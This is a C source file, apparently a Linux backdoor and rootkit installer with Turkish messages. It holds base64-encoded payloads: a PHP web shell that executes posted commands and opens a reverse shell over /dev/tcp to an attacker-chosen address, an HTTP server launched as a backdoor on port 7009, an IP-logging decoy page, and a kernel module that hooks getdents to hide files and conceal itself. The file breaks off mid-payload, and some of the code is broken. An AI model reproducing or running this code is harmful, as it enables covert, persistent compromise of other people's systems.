#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>







void phpback(){
	
  system("makedir /var/baba/");
  
  char b64httpser[] = "LyoKKgoqIC4vc2VydmVyIDk5OTEgLi92YXIvd3d3L2JhYmEgJgoqCiovCgojaW5jbHVkZSA8c3RkaW8uaD4KI2luY2x1ZGUgPHN0ZGxpYi5oPgojaW5jbHVkZSA8dW5pc3RkLmg+CiNpbmNsdWRlIDxlcnJuby5oPgojaW5jbHVkZSA8c3RyaW5nLmg+CiNpbmNsdWRlIDxmY250bC5oPgojaW5jbHVkZSA8c2lnbmFsLmg+CiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4KI2luY2x1ZGUgPGFycGEvaW5ldC5oPgoKI2RlZmluZSBCVUZTSVpFIDgwOTYKI2RlZmluZSBFUlJPUiA0MgojZGVmaW5lIFNPUlJZIDQzCiNkZWZpbmUgTE9HICAgNDQKCnN0cnVjdCB7CgljaGFyICpleHQ7CgljaGFyICpmaWxldHlwZTsKfSBleHRlbnNpb25zIFtdID0gewoJeyJnaWYiLCAiaW1hZ2UvZ2lmIiB9LCAgCgl7ImpwZyIsICJpbWFnZS9qcGVnIn0sIAoJeyJqcGVnIiwiaW1hZ2UvanBlZyJ9LAoJeyJwbmciLCAiaW1hZ2UvcG5nIiB9LCAgCgl7InppcCIsICJpbWFnZS96aXAiIH0sICAKCXsiZ3oiLCAgImltYWdlL2d6IiAgfSwgIAoJeyJ0YXIiLCAiaW1hZ2UvdGFyIiB9LCAgCgl7Imh0bSIsICJ0ZXh0L2h0bWwiIH0sICAKCXsiaHRtbCIsInRleHQvaHRtbCIgfSwgIAoJeyJwaHAiLCAiaW1hZ2UvcGhwIiB9LCAgCgl7ImNnaSIsICJ0ZXh0L2NnaSIgIH0sICAKCXsiYXNwIiwidGV4dC9hc3AiICAgfSwgIAoJeyJqc3AiLCAiaW1hZ2UvanNwIiB9LCAgCgl7InhtbCIsICJ0ZXh0L3htbCIgIH0sICAKCXsianMiLCJ0ZXh0L2pzIiAgICAgfSwKICAgeyJjc3MiLCJ0ZXN0L2NzcyIgICB9LCAKCgl7MCwwfSB9OwoKdm9pZCBsb2coaW50IHR5cGUsIGNoYXIgKnMxLCBjaGFyICpzMiwgaW50IG51bSkKewoJaW50IGZkIDsKCWNoYXIgbG9nYnVmZmVyW0JVRlNJWkUqMl07CgoJc3dpdGNoICh0eXBlKSB7CgljYXNlIEVSUk9SOiAodm9pZClzcHJpbnRmKGxvZ2J1ZmZlciwiRVJST1I6ICVzOiVzIEVycm5vPSVkIGV4aXRpbmcgcGlkPSVkIixzMSwgczIsIGVycm5vLGdldHBpZCgpKTsgYnJlYWs7CgljYXNlIFNPUlJZOiAKCQkodm9pZClzcHJpbnRmKGxvZ2J1ZmZlciwgIjxIVE1MPjxCT0RZPjxIMT5XZWIgU2VydmVyIFNvcnJ5OiAlcyAlczwvSDE+PC9CT0RZPjwvSFRNTD5cclxuIiwgczEsIHMyKTsKCQkodm9pZCl3cml0ZShudW0sbG9nYnVmZmVyLHN0cmxlbihsb2didWZmZXIpKTsKCQkodm9pZClzcHJpbnRmKGxvZ2J1ZmZlciwiU09SUlk6ICVzOiVzIixzMSwgczIpOyAKCQlicmVhazsKCWNhc2UgTE9HOiAodm9pZClzcHJpbnRmKGxvZ2J1ZmZlciwiIElORk86ICVzOiVzOiVkIixzMSwgczIsbnVtKTsgYnJlYWs7Cgl9CQoJCglpZigoZmQgPSBvcGVuKCJzZXJ2ZXIubG9nIiwgT19DUkVBVHwgT19XUk9OTFkgfCBPX0FQUEVORCwwNjQ0KSkgPj0gMCkgewoJCSh2b2lkKXdyaXRlKGZkLGxvZ2J1ZmZlcixzdHJsZW4obG9nYnVmZmVyKSk7IAoJCSh2b2lkKXdyaXRlKGZkLCJcbiIsMSk7ICAgICAgCgkJKHZvaWQpY2xvc2UoZmQpOwoJfQoJaWYodHlwZSA9PSBFUlJPUiB8fCB0eXBlID09IFNPUlJZKSBleGl0KDMpOwp9Cgp2b2lkIHdlYihpbnQgZmQsIGludCBoaXQpCnsKCWludCBqLCBmaWxlX2ZkLCBidWZsZW4sIGxlbjsKCWxvbmcgaSwgcmV0OwoJY2hhciAqIGZzdHI7CglzdGF0aWMgY2hhciBidWZmZXJbQlVGU0laRSsxXTsKCglyZXQgPXJlYWQoZmQsYnVmZmVyLEJVRlNJWkUpOyAKCWlmKHJldCA9PSAwIHx8IHJldCA9PSAtMSkgewoJCWxvZyhTT1JSWSwiZmFpbGVkIHRvIHJlYWQgYnJvd3NlciByZXF1ZXN0IiwiIixmZCk7Cgl9CglpZihyZXQgPiAwICYmIHJldCA8IEJVRlNJWkUpCQoJCWJ1ZmZlcltyZXRdPTA7CQoJZWxzZSBidWZmZXJbMF09MDsKCglmb3IoaT0wO2k8cmV0O2krKykJCgkJaWYoYnVmZmVyW2ldID09ICdccicgfHwgYnVmZmVyW2ldID09ICdcbicpCgkJCWJ1ZmZlcltpXT0nKic7Cglsb2coTE9HLCJyZXF1ZXN0IixidWZmZXIsaGl0KTsKCglpZiggc3RybmNtcChidWZmZXIsIkdFVCAiLDQpICYmIHN0cm5jbXAoYnVmZmVyLCJnZXQgIiw0KSApCgkJbG9nKFNPUlJZLCJPbmx5IHNpbXBsZSBHRVQgb3BlcmF0aW9uIHN1cHBvcnRlZCIsYnVmZmVyLGZkKTsKCglmb3IoaT00O2k8QlVGU0laRTtpKyspIHsgCgkJaWYoYnVmZmVyW2ldID09ICcgJykgeyAKCQkJYnVmZmVyW2ldID0gMDsKCQkJYnJlYWs7CgkJfQoJfQoKCWZvcihqPTA7ajxpLTE7aisrKSAJCgkJaWYoYnVmZmVyW2pdID09ICcuJyAmJiBidWZmZXJbaisxXSA9PSAnLicpCgkJCWxvZyhTT1JSWSwiUGFyZW50IGRpcmVjdG9yeSAoLi4pIHBhdGggbmFtZXMgbm90IHN1cHBvcnRlZCIsYnVmZmVyLGZkKTsKCglpZiggIXN0cm5jbXAoJmJ1ZmZlclswXSwiR0VUIC9cMCIsNikgfHwgIXN0cm5jbXAoJmJ1ZmZlclswXSwiZ2V0IC9cMCIsNikgKSAKCQkodm9pZClzdHJjcHkoYnVmZmVyLCJHRVQgL2luZGV4Lmh0bWwiKTsKCglidWZsZW49c3RybGVuKGJ1ZmZlcik7Cglmc3RyID0gKGNoYXIgKikwOwoJZm9yKGk9MDtleHRlbnNpb25zW2ldLmV4dCAhPSAwO2krKykgewoJCWxlbiA9IHN0cmxlbihleHRlbnNpb25zW2ldLmV4dCk7CgkJaWYoICFzdHJuY21wKCZidWZmZXJbYnVmbGVuLWxlbl0sIGV4dGVuc2lvbnNbaV0uZXh0LCBsZW4pKSB7CgkJCWZzdHIgPWV4dGVuc2lvbnNbaV0uZmlsZXR5cGU7CgkJCWJyZWFrOwoJCX0KCX0KCWlmKGZzdHIgPT0gMCkgbG9nKFNPUlJZLCJmaWxlIGV4dGVuc2lvbiB0eXBlIG5vdCBzdXBwb3J0ZWQiLGJ1ZmZlcixmZCk7CgoJaWYoKCBmaWxlX2ZkID0gb3BlbigmYnVmZmVyWzVdLE9fUkRPTkxZKSkgPT0gLTEpIAoJCWxvZyhTT1JSWSwgImZhaWxlZCB0byBvcGVuIGZpbGUiLCZidWZmZXJbNV0sZmQpOwoKCWxvZyhMT0csIlNFTkQiLCZidWZmZXJbNV0saGl0KTsKCgkodm9pZClzcHJpbnRmKGJ1ZmZlciwiSFRUUC8xLjAgMjAwIE9LXHJcbkNvbnRlbnQtVHlwZTogJXNcclxuXHJcbiIsIGZzdHIpOwoJKHZvaWQpd3JpdGUoZmQsYnVmZmVyLHN0cmxlbihidWZmZXIpKTsKCgl3aGlsZSAoCShyZXQgPSByZWFkKGZpbGVfZmQsIGJ1ZmZlciwgQlVGU0laRSkpID4gMCApIHsKCQkodm9pZCl3cml0ZShmZCxidWZmZXIscmV0KTsKCX0KI2lmZGVmIExJTlVYCglzbGVlcCgxKTsKI2VuZGlmCglleGl0KDEpOwp9CgoKaW50IG1haW4oaW50IGFyZ2MsIGNoYXIgKiphcmd2KQp7CglpbnQgaSwgcG9ydCwgcGlkLCBsaXN0ZW5mZCwgc29ja2V0ZmQsIGhpdDsKCXNpemVfdCBsZW5ndGg7CglzdGF0aWMgc3RydWN0IHNvY2thZGRyX2luIGNsaV9hZGRyOyAKCXN0YXRpYyBzdHJ1Y3Qgc29ja2FkZHJfaW4gc2Vydl9hZGRyOwoKCWlmKCBhcmdjIDwgMyAgfHwgYXJnYyA+IDMgfHwgIXN0cmNtcChhcmd2WzFdLCAiLT8iKSApIHsKCQkodm9pZClwcmludGYoInVzYWdlOiBzZXJ2ZXIgW3BvcnRdIFtzZXJ2ZXIgZGlyZWN0b3J5XSAmIgoJIlx0RXhhbXBsZTogc2VydmVyIDgwIC4vICZcblxuIgoJIlx0T25seSBTdXBwb3J0czoiKTsKCQlmb3IoaT0wO2V4dGVuc2lvbnNbaV0uZXh0ICE9IDA7aSsrKQoJCQkodm9pZClwcmludGYoIiAlcyIsZXh0ZW5zaW9uc1tpXS5leHQpOwoKCQkodm9pZClwcmludGYoIlxuXHROb3QgU3VwcG9ydGVkOiBkaXJlY3RvcmllcyAvIC9ldGMgL2JpbiAvbGliIC90bXAgL3VzciAvZGV2IC9zYmluIFxuIgoJCSAgICApOwoJCWV4aXQoMCk7Cgl9CglpZiggIXN0cm5jbXAoYXJndlsyXSwiLyIgICAsMiApIHx8ICFzdHJuY21wKGFyZ3ZbMl0sIi9ldGMiLCA1ICkgfHwKCSAgICAhc3RybmNtcChhcmd2WzJdLCIvYmluIiw1ICkgfHwgIXN0cm5jbXAoYXJndlsyXSwiL2xpYiIsIDUgKSB8fAoJICAgICFzdHJuY21wKGFyZ3ZbMl0sIi90bXAiLDUgKSB8fCAhc3RybmNtcChhcmd2WzJdLCIvdXNyIiwgNSApIHx8CgkgICAgIXN0cm5jbXAoYXJndlsyXSwiL2RldiIsNSApIHx8ICFzdHJuY21wKGFyZ3ZbMl0sIi9zYmluIiw2KSApewoJCSh2b2lkKXByaW50ZigiRVJST1I6IEJhZCB0b3AgZGlyZWN0b3J5ICVzLCBzZWUgc2VydmVyIC0/XG4iLGFyZ3ZbMl0pOwoJCWV4aXQoMyk7Cgl9CglpZihjaGRpcihhcmd2WzJdKSA9PSAtMSl7IAoJCSh2b2lkKXByaW50ZigiRVJST1I6IENhbid0IENoYW5nZSB0byBkaXJlY3RvcnkgJXNcbiIsYXJndlsyXSk7CgkJZXhpdCg0KTsKCX0KCglpZihmb3JrKCkgIT0gMCkKCQlyZXR1cm4gMDsgCgkodm9pZClzaWduYWwoU0lHQ0xELCBTSUdfSUdOKTsgCgkodm9pZClzaWduYWwoU0lHSFVQLCBTSUdfSUdOKTsgCglmb3IoaT0wO2k8MzI7aSsrKQoJCSh2b2lkKWNsb3NlKGkpOwkKCSh2b2lkKXNldHBncnAoKTsJCgoJbG9nKExPRywiaHR0cCBzZXJ2ZXIgc3RhcnRpbmciLGFyZ3ZbMV0sZ2V0cGlkKCkpOwoKCWlmKChsaXN0ZW5mZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwwKSkgPDApCgkJbG9nKEVSUk9SLCAic3lzdGVtIGNhbGwiLCJzb2NrZXQiLDApOwoJcG9ydCA9IGF0b2koYXJndlsxXSk7CglpZihwb3J0IDwgMCB8fCBwb3J0ID42MDAwMCkKCQlsb2coRVJST1IsIkludmFsaWQgcG9ydCBudW1iZXIgdHJ5IFsxLDYwMDAwXSIsYXJndlsxXSwwKTsKCXNlcnZfYWRkci5zaW5fZmFtaWx5ID0gQUZfSU5FVDsKCXNlcnZfYWRkci5zaW5fYWRkci5zX2FkZHIgPSBodG9ubChJTkFERFJfQU5ZKTsKCXNlcnZfYWRkci5zaW5fcG9ydCA9IGh0b25zKHBvcnQpOwoJaWYoYmluZChsaXN0ZW5mZCwgKHN0cnVjdCBzb2NrYWRkciAqKSZzZXJ2X2FkZHIsc2l6ZW9mKHNlcnZfYWRkcikpIDwwKQoJCWxvZyhFUlJPUiwic3lzdGVtIGNhbGwiLCJiaW5kIiwwKTsKCWlmKCBsaXN0ZW4obGlzdGVuZmQsNjQpIDwwKQoJCWxvZyhFUlJPUiwic3lzdGVtIGNhbGwiLCJsaXN0ZW4iLDApOwoKCWZvcihoaXQ9MTsgO2hpdCsrKSB7CgkJbGVuZ3RoID0gc2l6ZW9mKGNsaV9hZGRyKTsKCQlpZigoc29ja2V0ZmQgPSBhY2NlcHQobGlzdGVuZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikmY2xpX2FkZHIsICZsZW5ndGgpKSA8IDApCgkJCWxvZyhFUlJPUiwic3lzdGVtIGNhbGwiLCJhY2NlcHQiLDApOwoKCQlpZigocGlkID0gZm9yaygpKSA8IDApIHsKCQkJbG9nKEVSUk9SLCJzeXN0ZW0gY2FsbCIsImZvcmsiLDApOwoJCX0KCQllbHNlIHsKCQkJaWYocGlkID09IDApIHsKCQkJCSh2b2lkKWNsb3NlKGxpc3RlbmZkKTsKCQkJCXdlYihzb2NrZXRmZCxoaXQpOwoJCQl9IGVsc2UgewoJCQkJKHZvaWQpY2xvc2Uoc29ja2V0ZmQpOwoJCQl9CgkJfQoJfQp9";
  char httpser[] = "";

  char b64baba[] = "PD9waHAKCgogICAgZWNobycKICAgIDxodG1sPgoKPHN0eWxlPgouYnV0dG9uIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjM0NCQzhEOwogIGJvcmRlcjogbm9uZTsKICBjb2xvcjogd2hpdGU7CiAgcGFkZGluZzogOXB4IDYwcHg7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIHRleHQtZGVjb3JhdGlvbjogbm9uZTsKICBkaXNwbGF5OiBpbmxpbmUtYmxvY2s7CiAgZm9udC1zaXplOiAxNnB4OwogIG1hcmdpbjogOHB4IDBweDsKICBjdXJzb3I6IHBvaW50ZXI7Cn0KCgppbnB1dFt0eXBlPXRleHRdIHsKICB3aWR0aDogNTAlOwogIHBhZGRpbmc6IDEycHggMTVweDsKICBtYXJnaW46IDhweCAwOwogIGJveC1zaXppbmc6IGJvcmRlci1ib3g7CiAgYm9yZGVyOiBub25lOwogIGJhY2tncm91bmQtY29sb3I6ICMzQ0JDOEQ7CiAgY29sb3I6IHdoaXRlOwp9CgoKLnNxdWFyZS1ib3h7CiAgICBwb3NpdGlvbjogcmVsYXRpdmU7CiAgICB3aWR0aDogNTAlOwogICAgb3ZlcmZsb3c6IGhpZGRlbjsKICAgIGJhY2tncm91bmQ6IHdoaXRlOwp9Cjwvc3R5bGU+Cjxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOndoaXRlOyI+Cgo8U0NSSVBUIExBTkdVQUdFPSJKYXZhc2NyaXB0Ij48IS0tCgp2YXIgaXNOUyA9IChuYXZpZ2F0b3IuYXBwTmFtZSA9PSAiTmV0c2NhcGUiKSA/IDEgOiAwOwp2YXIgRW5hYmxlUmlnaHRDbGljayA9IDA7CmlmKGlzTlMpCmRvY3VtZW50LmNhcHR1cmVFdmVudHMoRXZlbnQuTU9VU0VET1dOfHxFdmVudC5NT1VTRVVQKTsKZnVuY3Rpb24gbWlzY2hhbmRsZXIoKXsKaWYoRW5hYmxlUmlnaHRDbGljaz09MSl7IHJldHVybiB0cnVlOyB9CmVsc2Uge3JldHVybiBmYWxzZTsgfQp9CmZ1bmN0aW9uIG1vdXNlaGFuZGxlcihlKXsKaWYoRW5hYmxlUmlnaHRDbGljaz09MSl7IHJldHVybiB0cnVlOyB9CnZhciBteWV2ZW50ID0gKGlzTlMpID8gZSA6IGV2ZW50Owp2YXIgZXZlbnRidXR0b24gPSAoaXNOUykgPyBteWV2ZW50LndoaWNoIDogbXlldmVudC5idXR0b247CmlmKChldmVudGJ1dHRvbj09Mil8fChldmVudGJ1dHRvbj09MykpIHJldHVybiBmYWxzZTsKfQpmdW5jdGlvbiBrZXloYW5kbGVyKGUpIHsKdmFyIG15ZXZlbnQgPSAoaXNOUykgPyBlIDogd2luZG93LmV2ZW50OwppZiAobXlldmVudC5rZXlDb2RlPT05NikKRW5hYmxlUmlnaHRDbGljayA9IDE7CnJldHVybjsKfQpkb2N1bWVudC5vbmNvbnRleHRtZW51ID0gbWlzY2hhbmRsZXI7CmRvY3VtZW50Lm9ua2V5cHJlc3MgPSBrZXloYW5kbGVyOwpkb2N1bWVudC5vbm1vdXNlZG93biA9IG1vdXNlaGFuZGxlcjsKZG9jdW1lbnQub25tb3VzZXVwID0gbW91c2VoYW5kbGVyOwovLy0tPgo8L3NjcmlwdD4KCjwvYm9keT4KCjxjZW50ZXI+CjxkaXYgY2xhc3M9InNxdWFyZS1ib3giPgo8Zm9ybSBhY3Rpb249IiIgbWV0aG9kPSJwb3N0Ij4KPGlucHV0IHR5cGU9InRleHQiIGlkPSJmbmFtZSIgbmFtZT0ia29tdXQiIHBsYWNlaG9sZGVyPSJ1bmFtZSAtYSI+CjxidXR0b24gbmFtZT0iZmFreXUiIGNsYXNzPSJidXR0b24iPkV4ZWN1dGU8L2J1dHRvbj4KPGJyPgo8YnI+Cjxicj4KPGJyPgo8aDQ+PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT08L2g0Pgo8aW5wdXQgdHlwZT0idGV4dCIgaWQ9ImZuYW1lIiBuYW1lPSJpcGFkcmVzIiBwbGFjZWhvbGRlcj0iaXBhZHJlc3MiPjxicj4KPGlucHV0IHR5cGU9InRleHQiIGlkPSJmbmFtZSIgbmFtZT0icG9ydCIgcGxhY2Vob2xkZXI9InBvcnQiPjxicj4KPGJ1dHRvbiBuYW1lPSJmYWt5dSIgY2xhc3M9ImJ1dHRvbiI+QmFnbGFudGkgR29uZGVyPC9idXR0b24+PGJyPgo8L2Zvcm0+CjwvZGl2Pgo8L2NlbnRlcj4KPC9odG1sPic7CgogICAgICBpZihpc3NldCgkX1BPU1RbJ2tvbXV0J10pKXsKCiAgICAgIGVjaG8gc3lzdGVtKCRfUE9TVFsna29tdXQnXSk7CiAgICB9CgoKICAgICAgaWYoaXNzZXQoJF9QT1NUWydpcGFkcmVzJ10pKXsKICAgICBlY2hvICc8Y2VudGVyPjxoMz5Db25uZWN0aW9uIFNlbmRlZC4uPC9oMz48L2NlbnRlcj4nOwoKICAgICAgc3lzdGVtKCcwPCYxMjEtO2V4ZWMgMTIxPD4vZGV2L3RjcC8nLiRfUE9TVFsnaXBhZHJlcyddLicvJy4kX1BPU1RbJ3BvcnQnXS4nO3NoIDwmMTIxID4mMTIxIDI+JjEyMT4nKTsKICAgICAgCiAgICAgIAogICAgICAKICAgIH0KCj8+";
  char babaphp[] = "";
  
  char b64guard[] = "PD9waHAKCiRpcGFkciA9IGh0bWxzcGVjaWFsY2hhcnMoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10pOwoKCgokaHRtbCA9ICc8aHRtbD4KCjxwcmU+CgogIF8gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfCl8vMFxfICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfL3hcXwooKiAqKSAgICAgICAgICAgICAgIEdBTUxJIEJBWUtVUyBWMS4wIHx8IEdVQVJEICAgICAgICAgICAgICAgICAgKCogKikKfCAtIHwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwgLSB8CihfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fKQoKCjwvcHJlPgoKPHA+WW91ciBJUCA6ICcuJGlwYWRyLicgCgoKV29ob2hvaG9vIEJpZyBIYWNrZXIuIFlvdXIgSVAgTG9nZ2VkLi48L3A+Cgo8L2h0bWw+JzsKCgplY2hvKCRodG1sKTsKCiRrb2sgPSBmb3BlbignbG9nbGFuYW5sYXIudHh0JywnYSsnKTsKZndyaXRlKCRrb2ssJGlwYWRyKTsKZmNsb3NlKCRrb2spOwoKPz4=";
  char guard[] = "";    

  char babadosya[] = "baba.c";
  char babadosya2[] = "baba.o";
  
  char insmodd[] = "insmod baba.ko hide=baba";


  b64_decode(b64httpser,httpser);
  b64_decode(b64baba,babaphp);
  b64_decode(b64guard,guard);
  
  FILE *zp;
  FILE *vp;
  FILE *wp;
  
  zp = fopen("/var/baba/baba.php", "w+");
  fprintf(zp, babaphp);
  fclose(zp);
  
  vp = fopen("/var/baba/index.php", "w+");
  fprintf(vp, guard);
  fclose(vp);
  
  wp = fopen("httpserver.c", "w+");
  fprintf(wp, httpser);
  fclose(wp);
  printf("[!] Kurulan Http Serverin Ekrana yazdiracagi \n Process ID sini httpsrv Dosyasini Gizlemeyi unutmayin..");
  
  printf("7009 Portuna Backdoor Kuruldu, Giris Yapablirsiniz..");
  system("gcc httpserver.c -o htpsrv ; ./htpsrv 7009 ./var/baba &");
  hidefile(babadosya);
  makefilegen(babadosya2);
  system("make");
  system(insmodd);
}









void makefilegen(char *sikimm){

	char hehe[500];
	
  sprintf(hehe,"obj-m += %s\nall:\n	 make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\nclean:\n	 make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\n\n",sikimm);
  FILE *am;
  system("rm Makefile");
  am = fopen("Makefile", "w+");
  fprintf(am, hehe);
  fclose(am);
  printf("[+] Makefile Olusturuldu..\n");
	
}




void hidefile(char *sikim){
  char b64lsgizle[] = "I2luY2x1ZGUgPGxpbnV4L2luaXQuaD4KI2luY2x1ZGUgPGxpbnV4L21vZHVsZS5oPgojaW5jbHVkZSA8bGludXgvbW9kdWxlcGFyYW0uaD4KI2luY2x1ZGUgPGxpbnV4L3N5c2NhbGxzLmg+CiNpbmNsdWRlIDxsaW51eC9rYWxsc3ltcy5oPgojaW5jbHVkZSA8bGludXgvc2xhYi5oPgojaW5jbHVkZSA8bGludXgva2Vybl9sZXZlbHMuaD4KI2luY2x1ZGUgPGxpbnV4L2dmcC5oPgojaW5jbHVkZSA8YXNtL3VuaXN0ZC5oPgojaW5jbHVkZSA8YXNtL3BhcmF2aXJ0Lmg+CiNpbmNsdWRlIDxsaW51eC9rZXJuZWwuaD4KCgoKTU9EVUxFX0xJQ0VOU0UoIkdQTCIpOwoKCgp1bnNpZ25lZCBsb25nICoqU1lTX0NBTExfVEFCTEU7CgoKCnZvaWQgRW5hYmxlUGFnZVdyaXRpbmcodm9pZCl7CiAgICB3cml0ZV9jcjAocmVhZF9jcjAoKSAmICh+MHgxMDAwMCkpOyAgLy8gU3lzY2FsbHRhYmxlIHlhem1hIGl6bmkgYWMKCn0gCnZvaWQgRGlzYWJsZVBhZ2VXcml0aW5nKHZvaWQpewogICAgd3JpdGVfY3IwKHJlYWRfY3IwKCkgfCAweDEwMDAwKTsgICAgLy9TeXNjYWxsdGFibGUgeWF6bWEgaXpuaSBrYXBhdAoKfSAKCgoKdm9pZCBtb2R1bGVfaGlkZSh2b2lkKSB7CiAgIGxpc3RfZGVsKCZUSElTX01PRFVMRS0+bGlzdCk7ICAgICAgICAgICAgIC8vcmVtb3ZlIGZyb20gcHJvY2ZzCiAgIGtvYmplY3RfZGVsKCZUSElTX01PRFVMRS0+bWtvYmoua29iaik7ICAgIC8vcmVtb3ZlIGZyb20gc3lzZnMKICAgVEhJU19NT0RVTEUtPnNlY3RfYXR0cnMgPSBOVUxMOwogICBUSElTX01PRFVMRS0+bm90ZXNfYXR0cnMgPSBOVUxMOwp9CgoKCnN0cnVjdCBsaW51eF9kaXJlbnQgewogICAgdW5zaWduZWQgbG9uZyAgICAgZF9pbm87ICAgIC8qIElub2RlIG51bWJlciAqLwogICAgdW5zaWduZWQgbG9uZyAgICAgZF9vZmY7ICAgICAgLyogT2Zmc2V0IHRvIG5leHQgbGludXhfZGlyZW50ICovCiAgICB1bnNpZ25lZCBzaG9ydCAgZF9yZWNsZW47IC8vIGRfcmVjbGVuIGlzIHRoZSB3YXkgdG8gdGVsbCB0aGUgbGVuZ3RoIG9mIHRoaXMgZW50cnkKICAgIGNoYXIgICAgICAgICAgICAgIGRfbmFtZVtdOyAgIC8vIHRoZSBzdHJ1Y3QgdmFsdWUgaXMgYWN0dWFsbHkgbG9uZ2VyIHRoYW4gdGhpcywgYW5kIGRfbmFtZSBpcyB2YXJpYWJsZSB3aWR0aC4KfSpkaXJwMiAsICpkaXJwMyAsICpyZXRuOyAgIC8vIC8vIGRpcnAgPSBkaXJlY3RvcnkgcG9pbnRlcgoKCnN0YXRpYyBjaGFyICpoaWRlOwptb2R1bGVfcGFyYW0oaGlkZSwgY2hhcnAsIDAwMDApOwpNT0RVTEVfUEFSTV9ERVNDKGhpZGUsICJBIGNoYXJhY3RlciBzdHJpbmciKTsKCgoKYXNtbGlua2FnZSBpbnQgKCAqb3JpZ2luYWxfZ2V0ZGVudHMgKSAodW5zaWduZWQgaW50IGZkLCBzdHJ1Y3QgbGludXhfZGlyZW50ICpkaXJwLCB1bnNpZ25lZCBpbnQgY291bnQpOyAKCiAKYXNtbGlua2FnZSBpbnQgIEhvb2tHZXREZW50cyh1bnNpZ25lZCBpbnQgZmQsIHN0cnVjdCBsaW51eF9kaXJlbnQgKmRpcnAsIHVuc2lnbmVkIGludCBjb3VudCl7CgogIHN0cnVjdCBsaW51eF9kaXJlbnQgKnJldG4sICpkaXJwMzsgCiAgaW50IFJlY29yZHMsIFJlbWFpbmluZ0J5dGVzLCBsZW5ndGg7CgogIFJlY29yZHMgPSAoKm9yaWdpbmFsX2dldGRlbnRzKSAoZmQsIGRpcnAsIGNvdW50KTsKCiAgaWYgKFJlY29yZHMgPD0gMCl7CiAgICByZXR1cm4gUmVjb3JkczsKICB9CgogIHJldG4gPSAoc3RydWN0IGxpbnV4X2RpcmVudCAqKSBrbWFsbG9jKFJlY29yZHMsIEdGUF9LRVJORUwpOwoKICBjb3B5X2Zyb21fdXNlcihyZXRuLCBkaXJwLCBSZWNvcmRzKTsKCiAgZGlycDMgPSByZXRuOwogIFJlbWFpbmluZ0J5dGVzID0gUmVjb3JkczsKICAKCiAgd2hpbGUoUmVtYWluaW5nQnl0ZXMgPiAwKXsKICAgIGxlbmd0aCA9IGRpcnAzLT5kX3JlY2xlbjsKICAgIFJlbWFpbmluZ0J5dGVzIC09IGRpcnAzLT5kX3JlY2xlbjsKICAKICAgIHByaW50ayhLRVJOX0lORk8gIlJlbWFpbmluZ0J5dGVzICVkICAgXHQgRmlsZTogJXMgIiAsICBSZW1haW5pbmdCeXRlcyAsIGRpcnAzLT5kX25hbWUgKTsKCiAgICBpZihzdHJjbXAoIChkaXJwMy0+ZF9uYW1lKSAsIGhpZGUgKSA9PSAwKXsKICAgICAgbWVtY3B5KGRpcnAzLCAoY2hhciopZGlycDMrZGlycDMtPmRfcmVjbGVuLCBSZW1haW5pbmdCeXRlcyk7CiAgICAgIFJlY29yZHMgLT0gbGVuZ3RoOyAvLyAgZGlycDMtPmRfcmVjbGVuOwogICAgfQogICAgZGlycDMgPSAoc3RydWN0IGxpbnV4X2RpcmVudCAqKSAoKGNoYXIgKilkaXJwMyArIGRpcnAzLT5kX3JlY2xlbik7CgogIH0KCiAgY29weV90b191c2VyKGRpcnAsIHJldG4sIFJlY29yZHMpOwogIGtmcmVlKHJldG4pOwogIHJldHVybiBSZWNvcmRzOwp9CgoKLy8gU2V0IHVwIGhvb2tzLgpzdGF0aWMgaW50IF9faW5pdCBTZXRIb29rcyh2b2lkKSB7CiAgICAgIC8va2FsbHN5bXMgaWxlIHZlcmkgY2VraXlvegogICAgIG1vZHVsZV9oaWRlKCk7IAogICAgU1lTX0NBTExfVEFCTEUgPSAodW5zaWduZWQgbG9uZyoqKWthbGxzeW1zX2xvb2t1cF9uYW1lKCJzeXNfY2FsbF90YWJsZSIpOyAKCiAgICBwcmludGsoS0VSTl9JTkZPICJIb29rcyBXaWxsIEJlIFNldC5cbiIpOwogICAgcHJpbnRrKEtFUk5fSU5GTyAiU3lzdGVtIGNhbGwgdGFibGUgYXQgJXBcbiIsIFNZU19DQUxMX1RBQkxFKTsKCiAgLy8gT3BlbnMgdGhlIG1lbW9yeSBwYWdlcyB0byBiZSB3cml0dGVuCiAgICBFbmFibGVQYWdlV3JpdGluZygpOwoKICAvLyBSZXBsYWNlcyBQb2ludGVyIE9mIFN5c2NhbGxfb3BlbiBvbiBvdXIgc3lzY2FsbC4KICAgIG9yaWdpbmFsX2dldGRlbnRzID0gKHZvaWQqKVNZU19DQUxMX1RBQkxFW19fTlJfZ2V0ZGVudHNdOwogICAgU1lTX0NBTExfVEFCTEVbX19OUl9nZXRkZW50c10gPSAodW5zaWduZWQgbG9uZyopSG9va0dldERlbnRzOwogICAgRGlzYWJsZVBhZ2VXcml0aW5nKCk7CgogICAgcmV0dXJuIDA7Cn0KCgoKCgoKCnN0YXRpYyB2b2lkIF9fZXhpdCBIb29rQ2xlYW51cCh2b2lkKSB7CgogICAgLy8gQ2xlYW4gdXAgb3VyIEhvb2tzCiAgICBFbmFibGVQYWdlV3JpdGluZygpOwogICAgU1lTX0NBTExfVEFCTEVbX19OUl9nZXRkZW50c10gPSAodW5zaWduZWQgbG9uZyopb3JpZ2luYWxfZ2V0ZGVudHM7CiAgICBEaXNhYmxlUGFnZVdyaXRpbmcoKTsKICAgIHByaW50ayhLRVJOX0lORk8gIkhvb2tzQ2xlYW5lZCBVcCEiKTsKfQoKbW9kdWx